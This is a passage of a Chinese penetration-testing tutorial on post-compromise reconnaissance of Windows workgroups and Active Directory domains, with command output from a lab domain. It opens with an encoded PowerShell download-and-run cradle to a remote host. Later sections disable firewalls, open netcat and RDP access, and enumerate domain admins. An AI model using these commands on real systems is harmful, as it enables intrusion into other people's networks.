<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-06_18-40-25.png"></p>
<h1 id="0x03-本地工作组信息收集"><a href="#0x03-本地工作组信息收集" class="headerlink" title="0x03 本地工作组信息收集"></a>0x03 本地工作组信息收集</h1><h2 id="1、手动收集本地工作组信息"><a href="#1、手动收集本地工作组信息" class="headerlink" title="1、手动收集本地工作组信息"></a>1、手动收集本地工作组信息</h2><ul>
<li>查看当前权限</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">whoami <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>本机网络配置信息</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>操作系统和版本信息（英文版）</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>操作系统和版本信息（中文版）</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看系统体系结构</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">echo %PROCESSOR_ARCHITECTURE%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看系统所有环境变量</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">set<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看安装的软件及版本和路径等信息</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic product get name,version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>利用 PowerShell 收集软件版本信息</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查询本机服务信息</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic service list brief<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查询进程列表</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>wmic 查看进程信息</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic process list brief<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看启动程序信息</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic startup get command,caption<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看计划任务</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看主机开启时间</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">net statistics workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查询用户列表</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">net user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li> 查看指定用户的信息</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">net user teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li> 查看本地管理员用户</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看当前在线用户</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">query user || qwinsta<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>列出或断开本地计算机和连接的客户端的会话 </li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">net session<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看端口列表</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">netstat –ano<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看补丁列表</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>使用 wmic 查看补丁列表</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotFixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看本机共享</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">net share<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>使用 wmic 查看共享列表</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic share get name,path,status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查询路由表及所有可用接口的ARP 缓存表 </li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">route printarp –a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p>查询防火墙相关配置 </p>
<ul>
<li>关闭防火墙</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)netsh advfirewall set allprofiles state off	(Windows Server 2003 系统之后版本)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>查看防火墙配置</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">netsh firewall show config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>修改防火墙配置</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">(Windows Server 2003 系统及之前版本)允许指定程序全部连接netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable(Windows Server 2003 之后系统版本)允许指定程序连入netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;允许 3389 端口放行netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>自定义防火墙日志储存位置</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>查看计算机代理配置情况 </p>
</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p>查询并开启远程连接服务</p>
<ul>
<li>查看远程连接端口（0xd3d换成10进制即3389）</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>在Windows Server 2003 中开启3389 端口</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h2 id="2、自动收集本地工作组信息"><a href="#2、自动收集本地工作组信息" class="headerlink" title="2、自动收集本地工作组信息"></a>2、自动收集本地工作组信息</h2><h3 id="wmic-脚本"><a href="#wmic-脚本" class="headerlink" title="wmic 脚本"></a>wmic 脚本</h3><p>wmic 脚本下载地址：<a target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
<p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-11_12-59-56.png"></p>
<h3 id="PowerShsell-Empire"><a href="#PowerShsell-Empire" class="headerlink" title="PowerShsell Empire"></a>PowerShsell Empire</h3><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p>
<ul>
<li><p>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</p>
</li>
<li><p>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</p>
</li>
</ul>
<p>当使用 Empire 使主机上线后，可调用<code>powershell/situational_awareness/host/winenum</code>模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-11_15-27-11.png"></p>
<p>调用<code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p>
<h1 id="0x04-域内信息收集"><a href="#0x04-域内信息收集" class="headerlink" title="0x04 域内信息收集"></a>0x04 域内信息收集</h1><h2 id="1、判断是否存在域"><a href="#1、判断是否存在域" class="headerlink" title="1、判断是否存在域"></a>1、判断是否存在域</h2><h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。    </p>
<pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; ipconfig &#x2F;all

Windows IP 配置
   主 DNS 后缀 . . . . . . . . . .  : teamssix.com
   DNS 后缀搜索列表  . . . . . . . . : teamssix.com

以太网适配器 Ethernet0:
   IPv4 地址 . . . . . . . . . . .. : 192.168.7.110
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.7.1
   DNS 服务器  . . . . . . . . . . . : 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP</p>
<pre class="line-numbers language-none"><code class="language-none">nslookup teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nslookup teamssix.com
服务器:  UnKnown
Address:  192.168.7.7
名称:    teamssix.com
Address:  192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="系统详细信息"><a href="#系统详细信息" class="headerlink" title="系统详细信息"></a>系统详细信息</h3><pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; systeminfo | findstr 域:
域: teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="当前登录域与域用户"><a href="#当前登录域与域用户" class="headerlink" title="当前登录域与域用户"></a>当前登录域与域用户</h3><pre class="line-numbers language-none"><code class="language-none">net config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net config workstation | findstr 域
工作站域                    TEAMSSIX
工作站域 DNS 名称            teamssix.com
登录域                      TEAMSSIX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net time &#x2F;domain\\dc.teamssix.com 的当前时间是 2021&#x2F;2&#x2F;13 20:49:56命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2、收集域内基础信息"><a href="#2、收集域内基础信息" class="headerlink" title="2、收集域内基础信息"></a>2、收集域内基础信息</h2><h3 id="查看域"><a href="#查看域" class="headerlink" title="查看域"></a>查看域</h3><pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net view &#x2F;domainDomain-------------------------------------------------------------------------------TEAMSSIX命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="查看域内计算机"><a href="#查看域内计算机" class="headerlink" title="查看域内计算机"></a>查看域内计算机</h3><pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain:domain_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net view &#x2F;domain:teamssix服务器名称            注解-------------------------------------------------------------------------------\\DANIEL10\\DANIEL7\\DC命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="查看域内用户组列表"><a href="#查看域内用户组列表" class="headerlink" title="查看域内用户组列表"></a>查看域内用户组列表</h3><pre class="line-numbers language-none"><code class="language-none">net group &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的组帐户-------------------------------------------------------------------------------*Admins*Domain Admins*Domain Computers*Domain Users*Enterprise Admins命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="查看域用户组信息"><a href="#查看域用户组信息" class="headerlink" title="查看域用户组信息"></a>查看域用户组信息</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;Enterprise Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &quot;Enterprise Admins&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Enterprise Admins注释     指定的公司系統管理員成员-------------------------------------------------------------------------------Administrator命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="查看域密码策略信息"><a href="#查看域密码策略信息" class="headerlink" title="查看域密码策略信息"></a>查看域密码策略信息</h3><pre class="line-numbers language-none"><code class="language-none">net accounts &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net accounts &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。强制用户在时间到期之后多久必须注销?:     从不密码最短使用期限(天):                  1密码最长使用期限(天):                  42密码长度最小值:                        7保持的密码历史记录长度:                 24锁定阈值:                            从不锁定持续时间(分):                      30锁定观测窗口(分):                      30计算机角色:                           PRIMARY命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="查看域信任信息"><a href="#查看域信任信息" class="headerlink" title="查看域信任信息"></a>查看域信任信息</h3><pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;domain_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nltest &#x2F;domain_trusts域信任的列表:    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3、收集域用户和管理员信息"><a href="#3、收集域用户和管理员信息" class="headerlink" title="3、收集域用户和管理员信息"></a>3、收集域用户和管理员信息</h2><h3 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h3><pre class="line-numbers language-none"><code class="language-none">net user &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net user &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的用户帐户-------------------------------------------------------------------------------admin                    Administrator                    daniel10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="查询域用户详细信息"><a href="#查询域用户详细信息" class="headerlink" title="查询域用户详细信息"></a>查询域用户详细信息</h3><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; wmic useraccount get &#x2F;allAccountType  Caption                        Description                                                     Disabled  Domain    FullName                               InstallDate  LocalAccount  Lockout  Name                  PasswordChangeable  PasswordExpires  PasswordRequired  SID                                            SIDType  Status512          DANIEL10\Administrator         管理计算机(域)的内置帐户                                        TRUE      DANIEL10                                                      TRUE          FALSE    Administrator         TRUE                FALSE            TRUE              S-1-5-21-1097120846-822447287-3576165687-500   1        Degraded512          DANIEL10\DefaultAccount        系统管理的用户帐户。                                            TRUE      DANIEL10                                                      TRUE          FALSE    DefaultAccount        TRUE                FALSE            FALSE             S-1-5-21-1097120846-822447287-3576165687-503   1        Degraded<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="查询存在的用户"><a href="#查询存在的用户" class="headerlink" title="查询存在的用户"></a>查询存在的用户</h3><pre class="line-numbers language-none"><code class="language-none">dsquery user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; dsquery user&quot;CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;teamssix,DC&#x3D;com&quot;&quot;CN&#x3D;Guest,CN&#x3D;Users,DC&#x3D;teamssix,DC&#x3D;com&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>常用的 dsquery 命令</p>
<pre class="line-numbers language-none"><code class="language-none">dsquery computer - 查找目录中的计算机dsquery contact - 查找目录中的联系人dsquery subnet - 查找目录中的子网dsquery group - 查找目录中的组dsquery ou - 查找目录中的组织单位dsquery site - 查找目录中的站点dsquery server - 查找目录中的域控制器dsquery user - 查找目录中的用户dsquery quota - 查找目录中的配额dsquery partition - 查找目录中的分区dsquery * - 用通用的 LDAP 查询查找目录中的任何对象<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="4、查找域控制器"><a href="#4、查找域控制器" class="headerlink" title="4、查找域控制器"></a>4、查找域控制器</h2><h3 id="查看域控器主机名"><a href="#查看域控器主机名" class="headerlink" title="查看域控器主机名"></a>查看域控器主机名</h3><pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;DCLIST:teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nltest &#x2F;DCLIST:teamssix获得域“teamssix”中 DC 的列表(从“\\DC”中)。    dc.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">nslookup -type&#x3D;SRV _ldap._tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nslookup -type&#x3D;SRV _ldap._tcp_ldap._tcp.teamssix.com SRV service location:          priority       &#x3D; 0          weight         &#x3D; 100          port           &#x3D; 389          svr hostname   &#x3D; dc.teamssix.comdc.teamssix.com internet address &#x3D; 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">netdom query pdc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; netdom query pdc域的主域控制器:DC命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="查看域控器组"><a href="#查看域控器组" class="headerlink" title="查看域控器组"></a>查看域控器组</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;domain controllers&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &quot;domain controllers&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Controllers注释     在網域所有的網域控制站成员-------------------------------------------------------------------------------DC$命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="5、定位域管理员"><a href="#5、定位域管理员" class="headerlink" title="5、定位域管理员"></a>5、定位域管理员</h2><h3 id="psloggedon"><a href="#psloggedon" class="headerlink" title="psloggedon"></a>psloggedon</h3><p>在 Windows 上使用 <code>net session</code> 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。</p>
<p>psloggedon 下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
<pre class="line-numbers language-none"><code class="language-none">psloggedon.exe [-] [-l] [-x] [\\computername|username]-								显示支持的选项和用于输出值的单位。-l							仅显示本地登录，不显示本地和网络资源登录。-x							不显示登录时间。\\computername	指定要列出登录信息的计算机的名称。Username				指定用户名，在网络中搜索该用户登录的计算机。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; PsLoggedon.exe -l \\192.168.7.7Users logged on locally:2021&#x2F;2&#x2F;13 20:53:08         TEAMSSIX\Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限。</p>
<p>PVEFindADUser 下载地址：<a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
<pre class="line-numbers language-none"><code class="language-none">-h											显示帮助信息-u											检测程序是否有新版本-current [&quot;username&quot;]		-current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC-noping									阻止尝试枚举用户登录名之前对目标计算机执行ping命令-target									此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; PVEFindADUser.exe -current [+] Finding currently logged on users ? true [+] Finding last logged on users ? false [+] Enumerating all computers... [+] Number of computers found : 15 [+] Launching queries     [+] Processing host : dc.teamssix.com (Windows Server 2008 R2 Datacenter;Service Pack 1)         - Logged on user : teamssix\administrator     [+] Processing host : daniel7.teamssix.com (Windows 7 专业版;Service Pack 1)     [+] Processing host : daniel10.teamssix.com (Windows 10 专业版) [+] Report written to report.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="netview"><a href="#netview" class="headerlink" title="netview"></a>netview</h3><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p>
<p>Netview 下载地址：<a target="_blank" rel="noopener" href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p>
<pre class="line-numbers language-none"><code class="language-none">-h               显示帮助信息-f filename.txt  指定要提取主机列表的文件-e filename.txt  指定要排除的主机名的文件-o filename.txt  将所有输出重定向到指定的文件-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索-c               对已找到的共享目录&#x2F;文件的访问权限进行检查-i interval      枚举主机之间等待的秒数-j jitter        应用于间隔的抖动百分比（0.0-1.0）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; netview.exe -d[+] Number of hosts: 3[+] Host: DANIEL10Enumerating AD Info[+] DANIEL10 - Comment -[+] D - OS Version - 10.0[+] DANIEL10 - MSSQL ServerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.110Enumerating Share InfoEnumerating Session InfoEnumerating Logged-on Users[+] DANIEL10 - Logged-on - TEAMSSIX\daniel10[+] Host: DCEnumerating AD Info[+] DC - Comment -[+] D - OS Version - 6.1[+] DC - Domain ControllerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.7……内容较多故省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h3><p>常用的 NSE 脚本如下：</p>
<p><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p>
<p><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p>
<p><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</p>
<p><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p>
<p><code>smb-enum-sessions.nse</code>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p>
<p><code>smb-os-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p>
<p>NES 脚本下载地址：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p>
<pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nmap --script&#x3D;smb-os-discovery.nse -p 445 192.168.7.107Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-21 09:44 CSTNmap scan report for 192.168.7.107Host is up (0.00053s latency).PORT    STATE SERVICE445&#x2F;tcp open  microsoft-dsHost script results:| smb-os-discovery:|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)|   OS CPE: cpe:&#x2F;o:microsoft:windows_7::sp1:professional|   Computer name: daniel7|   NetBIOS computer name: DANIEL7\x00|   Domain name: teamssix.com|   Forest name: teamssix.com|   FQDN: daniel7.teamssix.com|_  System time: 2021-02-21T09:44:33+08:00Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-23_17-38-11.png"></p>
